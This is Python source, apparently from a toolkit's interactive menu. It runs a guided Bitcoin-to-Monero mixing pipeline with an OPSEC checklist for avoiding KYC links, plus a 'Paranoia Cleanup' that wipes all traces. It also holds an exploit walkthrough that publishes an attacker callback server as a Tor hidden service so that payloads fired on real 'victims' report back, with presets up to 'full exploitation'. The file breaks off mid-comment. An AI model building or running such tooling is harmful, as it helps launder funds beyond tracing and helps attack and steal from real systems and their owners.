def menu_main(tor_ok: bool = False):
    clear()
    banner()
    _net = "" if tor_ok else f" {R}(Tor required){N}"
    print(f"  {G}── Send / Receive ─────────────────────────────────{N}")
    print(f"  {B}1{N}  Full Pipeline          BTC → mixed XMR (guided){_net}")
    print(f"  {B}2{N}  Receive (guided)       Create wallet → swap → mix{_net}")
    print(f"  {B}6{N}  Create Wallet          Generate new XMR receive address{_net}")
    print()
    print(f"  {C}── Advanced ───────────────────────────────────────{N}")
    print(f"  {B}3{N}  Cold / Air-Gap         Unsigned plan for offline signing{_net}")
    print(f"  {B}4{N}  Broadcast              Send signed TXs to the network{_net}")
    print(f"  {B}5{N}  Resume                 Continue after a crash{_net}")
    print(f"  {B}7{N}  Swap Preparer          ThorChain quote (standalone){_net}")
    print(f"  {B}8{N}  Exit Planner           Plan XMR off-ramp (live prices){_net}")
    print()
    print(f"  {Y}── Intel / Recon ──────────────────────────────────{N}")
    print(f"  {B}i{N}  Intel Gather           OSINT + vulnerability scan{_net}")
    print()
    print(f"  {M}── System ─────────────────────────────────────────{N}")
    print(f"  {B}0{N}  System Check           Verify Tor, Monero, deps")
    print(f"  {B}9{N}  Paranoia Cleanup       Wipe ALL traces from this machine")
    print(f"  {B}t{N}  Dry Run                Test the full pipeline (no real funds){_net}")
    print()
    print(f"  {D}q  quit{N}")
    if not tor_ok:
        print(f"\n  {R}Tor is not running. Network options are disabled.{N}")
        print(f"  {D}Start Tor, then choose 0 (System Check) to re-check.{N}")
    print()
    return prompt("Choose").strip().lower()


# ── Guided flows ───────────────────────────────────────────────────────────

def get_tor_proxy(detected_port: int = None) -> str:
    default_port = detected_port if detected_port else 9050
    p = prompt("Tor SOCKS proxy", f"socks5h://127.0.0.1:{default_port}")
    if p.startswith("socks5://") and not p.startswith("socks5h://"):
        warn("socks5:// leaks DNS — auto-correcting to socks5h://")
        p = p.replace("socks5://", "socks5h://", 1)
    if not p.startswith("socks5h://"):
        err(f"Proxy must be socks5h:// (got: {p[:20]}...)")
        info("Only socks5h:// is safe — it routes DNS through Tor.")
        info("Default: socks5h://127.0.0.1:9050 (system Tor) or :9150 (Tor Browser)")
        return ""
    return p


def get_rpc() -> str:
    return prompt("Wallet RPC endpoint", "http://127.0.0.1:18083")


def _opsec_preflight():
    """Display OPSEC pre-flight checklist before sensitive operations."""
    print(f"  {Y}{'=' * 60}{N}")
    print(f"  {R}OPSEC PRE-FLIGHT CHECKLIST{N}")
    print(f"  {Y}{'=' * 60}{N}")
    print(f"  {B}[ ]{N} Tor is running and verified")
    print(f"  {B}[ ]{N} BTC wallet uses Tor for transactions")
    print(f"  {B}[ ]{N} BTC was NOT purchased on a KYC exchange")
    print(f"      (or was moved through intermediate wallets first)")
    print(f"  {B}[ ]{N} You are not on a monitored network")
    print(f"      (employer/school/public WiFi)")
    print(f"  {B}[ ]{N} Screen recording/sharing is disabled")
    print(f"  {Y}{'=' * 60}{N}")
    print()
    print(f"  {R}CRITICAL:{N} Do NOT send BTC to ThorChain deposit addresses")
    print(f"  from a KYC exchange (Coinbase, Kraken, etc.).")
    print(f"  KYC exchanges record your identity with every transaction.")
    print(f"  Use an intermediate non-KYC wallet (e.g., Sparrow, Electrum")
    print(f"  with Tor) to break the direct link between your identity")
    print(f"  and the ThorChain deposit.")
    print()
    if not confirm("I have reviewed the checklist and understand the risks"):
        warn("Aborted by operator.")
        return False
    return True


def flow_full_pipeline(detected_port=None):
    heading("Full Pipeline: BTC → Mixed XMR")

    # Pre-check: warn if prior state exists
    _lock = ROOT / ".mixer.lock"
    if _lock.exists():
        warn("A mixer lock file exists from a prior run.")
        warn("Another instance may be running, or a prior run crashed.")
        if not confirm("Continue anyway? (the lock will be checked again by the pipeline)"):
            return

    if not _opsec_preflight():
        return
    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()
    btc = prompt("Your BTC address (bc1..., 1..., or 3...)")
    if not btc:
        err("BTC address is required.")
        info("Expected formats: bc1... (Bech32), 1... (legacy), or 3... (P2SH)")
        return
    if not (btc.startswith("bc1") or btc.startswith("1") or btc.startswith("3")):
        err(f"Invalid BTC address format.")
        info("Must start with bc1 (Bech32), 1 (legacy), or 3 (P2SH).")
        return

    amt = prompt("BTC amount to swap (e.g. 0.1)")
    try:
        amt_d = Decimal(amt)
        if amt_d <= 0:
            raise ValueError
        if amt_d < Decimal("0.0001"):
            warn(f"Very small amount ({amt} BTC) — fees may consume most of it")
        if amt_d > Decimal("10"):
            warn(f"Large amount ({amt} BTC) — consider splitting into smaller swaps")
    except (ValueError, TypeError, InvalidOperation):
        err(f"Invalid BTC amount: '{amt}'. Must be a positive number like 0.1 or 0.005")
        return

    splits = prompt("Split into how many chunks?", "2")
    wallets = prompt("Number of mix wallets", "10")
    depth = prompt("Mix depth", "2")

    for label, val, min_val in [("Split", splits, 1), ("Wallets", wallets, 3), ("Depth", depth, 1)]:
        try:
            v = int(val)
            if v < min_val:
                err(f"{label} must be at least {min_val} (got {val})")
                return
        except ValueError:
            err(f"{label} must be a number (got '{val}')")
            return

    print()
    info("Starting full pipeline...")
    info("This will: fetch quotes → build mixing DAG → sign → broadcast → clean up")
    print()

    args = [
        "--btc-entry", btc,
        "--btc-amount", amt,
        "--split", splits,
        "--wallets", wallets,
        "--deep", depth,
        "--tor-proxy", tor,
        "--rpc-primary", rpc,
    ]

    if run_script(CORE / "mixer_core", args, "Full pipeline"):
        print()
        ok("Pipeline completed.")
        info("Next: Run option 9 (Paranoia Cleanup) to wipe all traces.")
    else:
        err("Pipeline failed. Check the output above for details.")
        info("If the pipeline crashed mid-run, use option 5 (Resume) to continue.")


def flow_receive(detected_port=None):
    heading("Receive Funds (Guided)")
    print(f"  This guides you through the full receive flow:")
    print(f"  1. Create or select a receive wallet")
    print(f"  2. Get a ThorChain BTC deposit address for the sender")
    print(f"  3. Wait for BTC → XMR conversion")
    print(f"  4. Mix the received XMR")
    print()

    if not _opsec_preflight():
        return

    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()

    # Step 1: Wallet
    wallet_files = _find_wallet_files()
    if wallet_files:
        info(f"Found {len(wallet_files)} wallet(s)")
        choice = prompt("Use existing wallet? (y) or create new? (n)", "y").lower()
        if choice in ("y", "yes", ""):
            wf = prompt("Wallet JSON file", str(wallet_files[0]))
        else:
            info("Creating new receive wallet...")
            run_script(CORE / "create_receive_wallet", ["--rpc", rpc, "--tor-proxy", tor],
                       "Wallet creator")
            wallet_files = _find_wallet_files()
            if not wallet_files:
                err("Wallet creation failed.")
                return
            wf = str(wallet_files[0])
            ok("New wallet ready")
    else:
        info("No wallet found — creating one...")
        run_script(CORE / "create_receive_wallet", ["--rpc", rpc, "--tor-proxy", tor],
                   "Wallet creator")
        wallet_files = _find_wallet_files()
        if not wallet_files:
            err("Wallet creation failed.")
            return
        wf = str(wallet_files[0])
        ok("Wallet ready")

    # Load address from wallet JSON
    try:
        with open(wf) as _wf:
            _wdata = json.load(_wf)
        _addr = _wdata.get("address", "")

        # Warn if wallet is old (subaddresses don't expire, but stale wallets
        # from prior sessions may indicate the user forgot to clean up)
        import time as _time
        _wallet_created = _wdata.get("created", 0)
        if _wallet_created > 0:
            _wallet_age_hours = (_time.time() - _wallet_created) / 3600
            if _wallet_age_hours > 72:
                warn(f"This wallet is {_wallet_age_hours:.0f} hours old.")
                info("If this is from a prior session, consider creating a fresh wallet.")
    except (json.JSONDecodeError, OSError, KeyError):
        err(f"Cannot read wallet file: {Path(wf).name}")
        return

    # Step 2: ThorChain swap preparation
    print()
    heading("Step 2: Generate BTC Deposit Address")
    print(f"  The sender needs a BTC deposit address + memo to send BTC.")
    print(f"  ThorChain will convert BTC → XMR to your wallet address.")
    print()
    if confirm("Generate a ThorChain deposit address now?"):
        btc_amt = prompt("How much BTC will the sender send? (e.g. 0.1)")
        try:
            if Decimal(btc_amt) <= 0:
                raise ValueError
        except (ValueError, TypeError, InvalidOperation):
            err(f"Invalid BTC amount: '{btc_amt}'")
            return

        _swap_outfile = str(ROOT / f"thor_pairs_{os.urandom(4).hex()}.json")
        swap_args = ["--amounts", btc_amt, "--dests", _addr, "--tor-proxy", tor,
                     "--outfile", _swap_outfile, "--force"]
        if not run_script(CORE / "thor_swap_preparer", swap_args, "Swap preparer",
                           keep_env=("COINGECKO_API_KEY",)):
            err("Swap preparation failed.")
            return
    else:
        info("Skipping swap prep. When the sender has already sent BTC,")
        info("or you already have XMR on the wallet address, continue below.")

    # Step 3: Wait
    print()
    heading("Step 3: Wait for XMR")
    print(f"  Give the BTC deposit address + memo to the sender.")
    print(f"  Wait for the BTC → XMR conversion to complete on ThorChain.")
    print(f"  You can check your balance with monero-wallet-rpc or the wallet CLI.")
    print()
    if not confirm("XMR has arrived and is ready to mix?"):
        info("Come back when XMR has arrived. Choose option 2 again and select")
        info(f"the same wallet ({Path(wf).name}).")
        return

    # Step 4: Mix
    print()
    heading("Step 4: Mix XMR")
    wallets = prompt("Number of mix wallets", "10")
    depth = prompt("Mix depth", "2")

    args = [
        "--receive-wallet", wf,
        "--tor-proxy", tor,
        "--rpc-primary", rpc,
        "--wallets", wallets,
        "--deep", depth,
    ]
    if run_script(CORE / "mixer_core", args, "Mixing"):
        print()
        ok("Mixing completed.")
        info("Next: Run option 9 (Paranoia Cleanup) to wipe all traces.")
    else:
        err("Mixing failed. Check the output above for details.")
        info("If the pipeline crashed mid-run, use option 5 (Resume) to continue.")


def flow_cold(detected_port=None):
    heading("Cold / Air-Gap Mode")
    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()

    wallet_files = _find_wallet_files()
    if wallet_files:
        wf = prompt("Wallet JSON file", str(wallet_files[0]))
    else:
        wf = prompt("Path to wallet JSON file")

    info("This creates an unsigned plan. Transfer it to your offline machine for signing.")
    print()

    args = [
        "--receive-wallet", wf,
        "--tor-proxy", tor,
        "--rpc-primary", rpc,
        "--cold",
    ]
    if run_script(CORE / "mixer_core", args, "Cold mode"):
        print()
        ok("Unsigned plan created.")
        info("Next steps:")
        info("  1. Copy the 'unsigned/' folder to USB")
        info("  2. On your offline machine, sign the plan using the air-gap signer")
        info("  3. Copy the 'signed/' folder back to this machine")
        info("  4. Choose option 4 (Broadcast) from this menu")


def flow_broadcast(detected_port=None):
    heading("Broadcast Signed TXs")
    tor = get_tor_proxy(detected_port)
    if not tor:
        return

    signed_dir = ROOT / "tx_staging" / "signed"
    if signed_dir.is_dir():
        _blob_count = len(list(signed_dir.glob("*.signed")))
        if _blob_count > 0:
            ok(f"Found {_blob_count} signed blob(s) in default location")
        path = prompt("Signed blobs directory", str(signed_dir))
    else:
        print()
        info("No signed blobs found in the default location.")
        info("If you used air-gap signing, enter the path to your signed/ folder.")
        info("If you ran the full pipeline (option 1), blobs are created automatically.")
        print()
        path = prompt("Path to signed blobs (directory or manifest JSON)")

    rpc = prompt("Monero daemon RPC", "http://127.0.0.1:18081")
    wrpc = prompt("Wallet RPC (for submit_transfer)", "http://127.0.0.1:18083")

    args = [
        path,
        "--tor-proxy", tor,
        "--rpc", rpc,
        "--wallet-rpc", wrpc,
    ]
    if run_script(CORE / "broadcast_signed_xmr", args, "Broadcaster"):
        print()
        ok("Broadcast completed.")
        info("Next: Run option 9 (Paranoia Cleanup) to wipe all traces.")
    else:
        err("Broadcast had errors. Check the output above.")
        info("You may re-run option 4 to retry failed broadcasts.")


def flow_resume(detected_port=None):
    heading("Resume From Crash")
    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()

    plans = _find_plan_files()
    if plans:
        info(f"Found {len(plans)} plan(s)")
        plan = prompt("Plan file to resume", str(plans[0]))
    else:
        plan = prompt("Path to unsigned plan JSON")

    if not plan:
        err("Plan file path is required.")
        return
    if not Path(plan).exists():
        err(f"Plan file not found: {Path(plan).name}")
        info("Run option 1 or 3 first to generate a plan, then resume.")
        return

    wallet_files = _find_wallet_files()
    if wallet_files:
        wf = prompt("Wallet JSON file", str(wallet_files[0]))
    else:
        wf = prompt("Path to wallet JSON file")

    if not wf:
        err("Wallet JSON file is required for resume.")
        info("Create one first with option 6 (Create Wallet), or provide a path to an existing wallet_*.json")
        return

    # Detect resume mode: check if the plan has btc_entry (sender) or
    # receive_wallet (receiver) to pass the right CLI flag.
    resume_flag = "--receive-wallet"
    try:
        with open(plan) as _pf:
            _plan_data = json.load(_pf)

        _meta = _plan_data.get("meta")
        _txs = _plan_data.get("txs")
        if not isinstance(_meta, dict):
            err("Plan file is missing 'meta' key — not a valid plan.")
            info("This should be an unsigned_*.json file from the 'unsigned/' directory.")
            return
        if not isinstance(_txs, list) or len(_txs) == 0:
            err("Plan file has no 'txs' list (empty or missing) — nothing to resume.")
            info("Re-run the pipeline (option 1 or 3) to generate a fresh plan.")
            return
        _schema = _meta.get("schema", "")
        if _schema not in ("plan_v1", "unsigned_v1"):
            err(f"Unrecognized plan schema: '{_schema}'. Expected 'plan_v1' or 'unsigned_v1'.")
            info("This file may be from an incompatible version. Re-generate with this toolkit version.")
            return
        for i, _tx in enumerate(_txs):
            if not isinstance(_tx, dict) or "dst" not in _tx or "amt" not in _tx:
                err(f"TX {i} in plan is malformed (missing 'dst' or 'amt').")
                info("The plan file may be corrupt. Re-generate it with option 1 or 3.")
                return

        # Check for stale plans (old ThorChain quotes may have expired)
        _plan_created = _meta.get("created", 0)
        if _plan_created > 0:
            import time as _time
            _age_hours = (_time.time() - _plan_created) / 3600
            if _age_hours > 24:
                warn(f"This plan is {_age_hours:.0f} hours old.")
                warn("ThorChain quotes and fee estimates may be stale.")
                if not confirm("Continue with this plan?"):
                    info("Re-generate the plan with option 1 or 3.")
                    return
            elif _age_hours > 1:
                info(f"Plan age: {_age_hours:.1f} hours. Check quote expiry before sending BTC.")

        if _meta.get("mock"):
            warn("This is a MOCK plan (dry-run) — it cannot be broadcast with real funds.")
            return

        if _meta.get("btc_entry"):
            resume_flag = "--btc-entry"
            wf_arg = _meta["btc_entry"]
            info("Sender resume detected.")
        else:
            wf_arg = wf
    except json.JSONDecodeError as e:
        err("Plan file is not valid JSON (may be corrupt).")
        return
    except OSError as e:
        err("Cannot read plan file.")
        return
    except KeyError as e:
        warn("Could not read plan metadata, defaulting to receive-wallet mode.")
        wf_arg = wf

    args = [
        resume_flag, wf_arg,
        "--resume-plan", plan,
        "--tor-proxy", tor,
        "--rpc-primary", rpc,
    ]
    if run_script(CORE / "mixer_core", args, "Resume"):
        print()
        ok("Resume completed.")
        info("Next: Run option 9 (Paranoia Cleanup) to wipe all traces.")
    else:
        err("Resume failed. Check the output above.")


def flow_create_wallet(detected_port=None):
    heading("Create Receive Wallet")

    # Check if wallets already exist
    _existing = _find_wallet_files()
    if _existing:
        info(f"You already have {len(_existing)} wallet(s).")
        if not confirm("Create another wallet?"):
            info("Use option 2 (Receive) to continue with an existing wallet.")
            return

    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()
    args = ["--rpc", rpc, "--tor-proxy", tor]
    if run_script(CORE / "create_receive_wallet", args, "Wallet creator"):
        print()
        ok("Wallet created.")
        info("Next steps:")
        info("  Option 2 (Receive) — full guided receive flow")
        info("  Option 7 (Swap Preparer) — generate deposit address for sender")


def flow_swap_preparer(detected_port=None):
    heading("ThorChain Swap Preparer (standalone)")
    print(f"  This generates a BTC deposit address + memo for ThorChain swaps.")
    print(f"  For the full guided receive flow, use option 2 instead.")
    print()
    tor = get_tor_proxy(detected_port)
    if not tor:
        return

    wallet_files = _find_wallet_files()
    dest = ""
    if wallet_files:
        info(f"Found {len(wallet_files)} wallet(s)")
        use_wf = prompt("Load XMR address from wallet JSON? (y/n)", "y").lower()
        if use_wf in ("y", "yes", ""):
            wf_path = prompt("Wallet JSON file", str(wallet_files[0]))
            try:
                with open(wf_path) as _f:
                    dest = json.load(_f).get("address", "")
                if dest:
                    ok(f"Address loaded from {Path(wf_path).name}")
            except (json.JSONDecodeError, KeyError, OSError) as e:
                err(f"Cannot read wallet file: {Path(wf_path).name}")
                return

    if not dest:
        dest = prompt("XMR destination address")
    if not dest:
        err("XMR address is required.")
        return

    amt = prompt("BTC amount to swap (e.g. 0.1)")
    try:
        if Decimal(amt) <= 0:
            raise ValueError
    except (ValueError, TypeError, InvalidOperation):
        err(f"Invalid BTC amount: '{amt}'")
        return

    _outfile = str(ROOT / f"thor_pairs_{os.urandom(4).hex()}.json")
    args = ["--amounts", amt, "--dests", dest, "--tor-proxy", tor,
            "--outfile", _outfile, "--force"]
    if not run_script(CORE / "thor_swap_preparer", args, "Swap preparer",
                       keep_env=("COINGECKO_API_KEY",)):
        err("Swap preparation failed.")
    else:
        ok("Deposit instructions generated — see output above.")


def flow_exit_planner(detected_port=None):
    heading("Exit Strategy Planner")
    print(f"  Uses LIVE market prices via Tor to plan XMR off-ramp.")
    print(f"  Supports: Bisq, Haveno, P2P, Azteco")
    print()
    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    amt = prompt("XMR amount to off-ramp")
    if not amt:
        err("Amount is required.")
        return
    try:
        if Decimal(amt) <= 0:
            raise ValueError
    except (ValueError, TypeError, InvalidOperation):
        err("Amount must be a positive number.")
        return
    method = prompt("Method (bisq / haveno / p2p / azteco)", "bisq")
    if method not in ("bisq", "haveno", "p2p", "azteco"):
        err(f"Unknown method: {method}")
        return
    args = [amt, "--method", method, "--tor-proxy", tor]
    if run_script(CORE / "exit_strategy_planner", args, "Exit planner",
                   keep_env=("COINGECKO_API_KEY",)):
        ok("Exit plan generated.")
    else:
        err("Exit planning failed — see output above.")


def _detect_iface() -> str:
    """Auto-detect active network interface."""
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5,
                           env=_sanitized_env())
        if r.returncode == 0 and "dev " in r.stdout:
            import re
            m = re.search(r"dev\s+(\S+)", r.stdout)
            if m:
                return m.group(1)
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass  # ip command not available — use fallback
    return "eth0"


def flow_paranoia():
    heading("Paranoia Mode — Wipe All Traces")
    detected = _detect_iface()
    iface = prompt(f"Network interface", detected)

    extra_dirs = [str(ROOT)]
    extra = prompt("Additional directories to search (comma-separated, or Enter to skip)", "")
    if extra.strip():
        extra_dirs.extend([d.strip() for d in extra.split(",") if d.strip()])

    search_args = []
    for d in extra_dirs:
        search_args.extend(["--search-dir", d])

    print()
    warn("Cleanup searches: toolkit root, home directory, common system paths,")
    warn("and any extra directories you specified. Files in other locations")
    warn("(external drives, unusual paths) may NOT be found.")
    print()

    if confirm("Dry run first? (shows what WOULD be deleted without deleting)"):
        run_script(OPSEC / "paranoia_mode", ["--iface", iface, "--dry-run"] + search_args,
                   "Paranoia dry-run")
        print()
        if not confirm("Proceed with REAL wipe? THIS IS DESTRUCTIVE"):
            return

    run_script(OPSEC / "paranoia_mode", ["--iface", iface] + search_args, "Paranoia mode")


def flow_testnet(detected_port=None):
    heading("Testnet / Dry Run Mode")
    print(f"  This simulates the full pipeline without touching real funds.")
    print(f"  It creates a mock plan with fake 10 XMR balance and runs through")
    print(f"  all stages except actual broadcast.\n")

    tor = get_tor_proxy(detected_port)
    if not tor:
        return
    rpc = get_rpc()

    wallet_files = _find_wallet_files()
    if wallet_files:
        wf = prompt("Wallet JSON (or press Enter to create one)", str(wallet_files[0]))
    else:
        info("No wallet found — creating one first...")
        if not run_script(CORE / "create_receive_wallet",
                           ["--rpc", rpc, "--tor-proxy", tor],
                           "Wallet creator"):
            err("Wallet creator failed — cannot continue dry run.")
            return
        wallet_files = _find_wallet_files()
        if not wallet_files:
            err("Wallet creator ran but no wallet_*.json was produced.")
            return
        wf = str(wallet_files[0])

    info("Running in cold mode (creates plan, no broadcast)...")
    args = [
        "--receive-wallet", wf,
        "--tor-proxy", tor,
        "--rpc-primary", rpc,
        "--cold",
    ]
    if run_script(CORE / "mixer_core", args, "Testnet"):
        ok("Dry-run plan created")
        plans = _find_plan_files()
        if plans:
            try:
                with open(plans[0]) as f:
                    p = json.load(f)
                txs = p.get("txs", [])
                info(f"TXs in plan: {len(txs)}")
                if p.get("meta", {}).get("mock"):
                    warn("This is a MOCK plan — cannot be signed/broadcast with real wallet")
            except (json.JSONDecodeError, OSError):
                pass

        if confirm("Run paranoia cleanup (dry-run) to see what would be wiped?"):
            run_script(OPSEC / "paranoia_mode", ["--dry-run", "--search-dir", str(ROOT)],
                       "Paranoia dry-run")


def _load_latest_report(ram_dir: Path) -> Optional[dict]:
    """Load the most recent intel report, handling decryption if needed."""
    reports = sorted(ram_dir.glob("intel_*"), key=lambda f: f.stat().st_mtime, reverse=True)
    if not reports:
        return None
    latest = reports[0]

    if latest.suffix == ".enc":
        try:
            from cryptography.fernet import Fernet as _F
        except ImportError:
            err("cryptography package needed to read encrypted reports.")
            return None
        import getpass as _gp
        key = _gp.getpass("  Enter decryption key: ")
        if not key:
            return None
        try:
            cipher = _F(key.encode() if isinstance(key, str) else key)
            return json.loads(cipher.decrypt(latest.read_bytes()))
        except Exception:
            err("Decryption failed — wrong key or corrupt file.")
            return None
    else:
        try:
            return json.loads(latest.read_text())
        except (json.JSONDecodeError, OSError):
            err("Cannot read report file.")
            return None


_WALKTHROUGH_PRESETS = {
    "stealth": {
        "label": "Stealth",
        "desc": "Minimal footprint — confirmation-only recon steps, no exploitation",
        "skip_risk": ("HIGH", "CRITICAL"),
        "auto_files": True,
        "timeout": 15,
        "delay_lo": 3.0,
        "delay_hi": 8.0,
    },
    "balanced": {
        "label": "Balanced",
        "desc": "Default — all steps available, confirmations on high-risk",
        "skip_risk": (),
        "auto_files": True,
        "timeout": 30,
        "delay_lo": 1.0,
        "delay_hi": 4.0,
    },
    "aggressive": {
        "label": "Aggressive",
        "desc": "Full exploitation — all steps, shorter delays",
        "skip_risk": (),
        "auto_files": True,
        "timeout": 45,
        "delay_lo": 0.3,
        "delay_hi": 2.0,
    },
}


def _intel_exploit_walkthrough(tor_proxy: str, auto_mode: bool = False):
    """Exploit walkthrough with interactive control and smart automation.

    Smart interactive mode (default, auto_mode=False):
    - User drives each step with r/e/s/n/q
    - All exploit files pre-generated upfront + served via ExploitServer
    - Output captured and chained to subsequent steps
    - Full audit trail and session report

    Auto mode (auto_mode=True):
    - Same as interactive but default action is auto-run
    - Still shows each step and gives control (r/s/n/q)
    - Files pre-generated, server running, outputs chained
    """

    ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
    if not ram_dir.exists():
        info("No scan results found. Run a scan first.")
        return

    report_data = _load_latest_report(ram_dir)
    if not report_data:
        info("No scan results found. Run a scan first.")
        return

    vulns = report_data.get("vulnerabilities", [])
    exploitable = [v for v in vulns if v.get("exploitable")]

    if not exploitable:
        info("No exploitable findings in the latest scan.")
        info(f"Total findings: {len(vulns)}")
        return

    file_mgr = ExploitFileManager(ttl_seconds=600)
    audit = AuditTrail()
    server = ExploitServer(file_mgr)
    # TorClient + StepExecutor created after preset selection (needs delay config)

    _client = None
    _executor = None
    try:
        _client, _executor = _walkthrough_main(
            exploitable, vulns, tor_proxy, auto_mode,
            file_mgr, audit, server)
    except (KeyboardInterrupt, EOFError):
        print()
        warn("Interrupted — cleaning up...")
    except Exception as _e:
        err(f"Walkthrough error: {type(_e).__name__}: {_e}")
    finally:
        if _client:
            _client.close()
        _walkthrough_cleanup(file_mgr, audit, _executor, server)


def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
                      file_mgr, audit, server):
    """Core walkthrough logic, wrapped in try/finally by caller.
    Returns (TorClient, StepExecutor) for cleanup."""

    if file_mgr.disk_warning:
        print(f"  {R}WARNING: /dev/shm not available — files stored on disk, not RAM.{N}")
        print(f"  {R}Use a system with tmpfs for OPSEC-safe operation.{N}")
        print()

    base_url = _extract_base_url_from_vulns(vulns) or "[TARGET]"
    _proxy_port = urlparse(tor_proxy).port or 9050
    _sp = f"--socks5-hostname 127.0.0.1:{_proxy_port}"

    audit.log("session_start", f"target: {base_url}, findings: {len(exploitable)}")

    heading("Exploit Walkthrough")
    print(f"  {B}Session:{N}  {audit.session_id}")
    print(f"  {B}Findings:{N} {len(exploitable)} exploitable vulnerabilities")
    print(f"  {B}Base URL:{N} {base_url}")
    print(f"  {B}Storage:{N}  {'RAM (/dev/shm)' if not file_mgr.disk_warning else 'DISK (no /dev/shm)'}")
    print()

    # ── Preset selection ──
    print(f"  {B}Presets:{N}")
    for key, p in _WALKTHROUGH_PRESETS.items():
        print(f"    {G}{key:12s}{N}  {p['desc']}")
    print()
    preset_name = prompt("Preset", "balanced").lower()
    preset = _WALKTHROUGH_PRESETS.get(preset_name, _WALKTHROUGH_PRESETS["balanced"])
    client = TorClient(
        proxy_url=tor_proxy, audit=audit,
        delay_lo=preset["delay_lo"], delay_hi=preset["delay_hi"],
        timeout=preset["timeout"],
    )
    executor = StepExecutor(client, audit)

    ok(f"Preset: {preset['label']} (timeout={preset['timeout']}s, "
       f"delays={preset['delay_lo']}-{preset['delay_hi']}s)")
    print()

    # ── Target URL override ──
    custom_url = prompt("Override target URL (or Enter to use detected)", "")
    if custom_url.strip():
        custom_url = custom_url.strip().rstrip("/")
        # Accept either a full URL or a bare host — the rest of the
        # walkthrough assumes base_url has a scheme so urlparse().netloc
        # works. Defaulting to https:// is safer than http://.
        if not (custom_url.startswith("http://") or
                custom_url.startswith("https://")):
            custom_url = f"https://{custom_url}"
        base_url = custom_url
        audit.log("url_override", f"target changed to: {base_url[:60]}")
        ok(f"Target URL set to: {base_url}")
        print()

    # ── Attacker callback + server ──
    #
    # The attacker URL is where payloads call back to after firing on the
    # victim. Three modes:
    #
    #   onion   — server binds 127.0.0.1, tor control port publishes an
    #             ephemeral ED25519-V3 hidden service, payloads embed
    #             http://<onion>.onion/<kind>/<token>. Victims with Tor
    #             Browser (or any SOCKS5 client) reach it with no
    #             clearnet exposure. Onion is torn down on session end.
    #   local   — server binds 127.0.0.1 only. Useful for testing
    #             payloads in a browser running on the same machine,
    #             but victims on real targets cannot reach it.
    #   custom  — operator provides an already-reachable URL (their own
    #             tunnel / onion / VPS). The local server still runs to
    #             serve files; operator MUST tunnel port -> chosen URL.
    #
    # In every mode we derive tokenised callback URLs from AttackerInfra
    # so payloads can never be polluted by random scanners/bots.
    print(f"  {B}Attacker infra modes:{N}")
    print(f"    {G}onion{N}   Publish local server as a Tor ephemeral hidden service")
    print(f"    {G}local{N}   Loopback only (127.0.0.1) — lab/self-test")
    print(f"    {G}custom{N}  Operator-provided reachable URL")
    print()
    infra_mode = prompt("Attacker infra", "onion").lower().strip()
    if infra_mode not in ("onion", "local", "custom"):
        infra_mode = "onion"

    # Always start the local server (we still serve files + accept callbacks
    # from localhost and — for onion — via the HS).
    try:
        local_port = server.start()
    except Exception as _e:
        err(f"Failed to start local attacker server: {_e}")
        return client, executor
    audit.log("server_start", f"local_port: {local_port}")

    attacker_url = ""
    onion_host = None

    if infra_mode == "onion":
        _ctrl_port_str = prompt("Tor control port", "9051").strip() or "9051"
        try:
            _ctrl_port = int(_ctrl_port_str)
        except ValueError:
            _ctrl_port = 9051
        _ctrl_pw = os.environ.get("TOR_CONTROL_PASSWORD", "")
        info("Publishing ephemeral hidden service via Tor control port...")
        onion_host = server.start_hidden_service(
            control_port=_ctrl_port, control_password=_ctrl_pw)
        if onion_host:
            attacker_url = f"http://{onion_host}"
            ok(f"Hidden service: {onion_host}")
            audit.log("hs_start", onion_host, risk=AuditTrail.RISK_MEDIUM)
        else:
            # Silent fallback to 'local' mode would render every
            # exploit payload unreachable — victims on the real
            # internet can't hit 127.0.0.1. Previously the operator
            # would learn this only when captures never arrived. Make
            # them consciously opt out of onion mode.
            err("Hidden service setup FAILED.")
            _hs_detail = server.last_hidden_service_error
            if _hs_detail:
                err(f"  detail: {_hs_detail}")
            err("Likely reasons:")
            err("  * Tor ControlPort not open (add 'ControlPort 9051'")
            err("    to /etc/tor/torrc and restart tor). If you use Tor")
            err("    Browser instead of system tor, its control port is")
            err("    9151 — this script auto-tries both 9051 and 9151.")
            err("  * Neither CookieAuthentication nor HashedControlPassword")
            err("    is configured (add 'CookieAuthentication 1' to torrc,")
            err("    or set TOR_CONTROL_PASSWORD env before launching).")
            err("  * stem python package not importable under this venv.")
            err("")
            err("Without an onion, victims on the real internet cannot")
            err("reach your callback server. You have three options:")
            err("  1. abort this walkthrough, fix the Tor control port,")
            err("     and retry with 'onion' again")
            err("  2. fall back to 'local' (loopback only — LAB USE ONLY)")
            err("  3. fall back to 'custom' (you'll be prompted for a")
            err("     reachable URL that proxies to the local server)")
            _choice = prompt("Choose 1/2/3 (default: 1 = abort)", "1").strip()
            if _choice == "2":
                warn("Continuing in 'local' mode — callbacks WILL NOT "
                     "be received from real targets.")
                infra_mode = "local"
            elif _choice == "3":
                info("Switching to 'custom' mode.")
                infra_mode = "custom"
            else:
                audit.log("hs_setup_failed_abort",
                          "operator aborted after onion failure",
                          risk=AuditTrail.RISK_MEDIUM)
                err("Aborting walkthrough.")
                return client, executor

    if infra_mode == "local":
        attacker_url = f"http://127.0.0.1:{local_port}"
        ok(f"Local-only attacker server on :{local_port}")
        warn("Victims on the internet cannot reach 127.0.0.1 — lab use only.")

    if infra_mode == "custom":
        while True:
            custom = prompt(
                "Reachable attacker URL (e.g. http://abc.onion or "
                "https://x.example — must proxy to this server's local port)",
                "")
            custom = custom.strip()
            if not custom:
                continue
            if not (custom.startswith("http://") or
                    custom.startswith("https://")):
                err("URL must start with http:// or https://")
                continue
            attacker_url = custom.rstrip("/")
            audit.log("custom_attacker_url", attacker_url)
            ok(f"Custom attacker URL: {attacker_url}")
            warn(f"Ensure {attacker_url} proxies to "
                 f"http://127.0.0.1:{local_port}")
            break

    # Build callback URLs for payload substitution. Each kind has its
